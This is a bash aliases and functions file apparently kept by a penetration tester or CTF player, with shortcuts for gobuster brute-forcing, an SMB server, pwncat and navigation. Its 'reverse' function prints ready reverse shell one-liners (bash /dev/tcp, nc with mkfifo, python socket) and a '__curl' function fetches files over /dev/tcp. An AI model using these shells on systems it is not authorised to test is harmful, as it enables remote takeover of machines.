#My Aliases
alias pysrv='python3 -m http.server 80'
alias thmvpn='sudo openvpn /home/jason/Downloads/jhart1992.ovpn'
alias smbsrv='sudo impacket-smbserver smb /home/jason/Tools -smb2support'
alias sshforward="echo 'Local Port Forward:\n ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER\nRemote Port Forward:\n ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER\nDynamic Port Forward:\n ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER'"
alias gosmall="gobuster dir --wordlist=/usr/share/wordlists/dirb/common.txt -u"
alias gobig="gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u"
alias gosub="gobuster vhost -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -u"

alias .1='cd ..' # see .. function
alias .2='.. 2'
alias .3='.. 3'
alias .4='.. 4'
alias .5='.. 5'
alias .6='.. 6'
alias .7='.. 7'
alias .8='.. 8'
alias ..1='.1'
alias ..2='.2'
alias ..3='.3'
alias ..4='.4'
alias ..5='.5'
alias ..6='.6'
alias ..7='.7'
alias ..8='.8'
alias ...='.. 2'
alias ....='.. 3'
alias .....='.. 4'
alias ......='.. 5'
alias .......='.. 6'
alias .......='.. 7'
alias ........='.. 8'
alias cd..='cd ..'
alias cd...='.. 2'
alias cd....='.. 3'
alias cd.....='.. 4'
alias cd......='.. 5'
alias cd.......='.. 6'
alias cd........='.. 7'
alias cd.........='.. 8'
alias cat='bat --paging=never'
alias pwncat='/home/$USER/pwncat/bin/pwncat-cs'
alias chef='firefox /snap/cyberchef/current/index.html'

function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
 
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
# USAGE: __curl http://www.example.com/exploit.py > sploitz.py


reverse ()
{
  local port=443;
  adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f 2 | sed 's/://g');
  OPTIND=1;
  usage()( echo "reverse [-i <interface>] [-l <language>] [-p <port>]";
  printf "Language Options:\n  bash\n  nc\n  python\n\n" );
  while getopts ":i:l:p:h" options; do
      case "${options}" in
        i) local interface=${OPTARG};
          if ! echo $interface |  egrep -qo "public"; then
            if ! echo $adaptors | grep -qo "$interface"; then
              echo  "Interface "${OPTARG}" does not exist";
              usage;
              return;
            fi;
          fi
          ;;
        l) local language=${OPTARG}
          ;;
        p) local port=${OPTARG}
          ;;
        h) usage;
          return
          ;;
        :) echo "Error: -${OPTARG} requires an argument";
          usage;
          return
          ;;
        *) echo "Unknown Switch: -${OPTARG}";
          usage;
          return
          ;;
        esac;
      done;
      if [ -z $interface ]; then
        if ip a | egrep -qo "tun0"; then
          local interface="tun0";
        elif echo $interface | egrep -qo "public" ; then
          local interface="public";
        elif ip a | egrep -qo "eth0"; then
          local interface="eth0";
        elif ip a | egrep -qo "ens33"; then
          local interface="ens33";
        else
          local interface="lo";
        fi;
      fi;
      if echo $interface | egrep -qo "public"; then
        local ip=$(wget -qO - ipv4.icanhazip.com);
      else
        local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}.){3}[0-9]{1,3}" | head -1);
      fi;
      local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);
      declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" );
      if [ -z $language ]; then
        printf "\n";
        for i in "${shells[@]}";do
          printf "$i\n\n";
        done;
        return;
      fi;
      printf "\n${shells[$language]}\n\n"; }

#My wordlist variable exports
export dirsmall='/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'
export dirmed='/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'
export rockyou='/usr/share/wordlists/rockyou.txt'
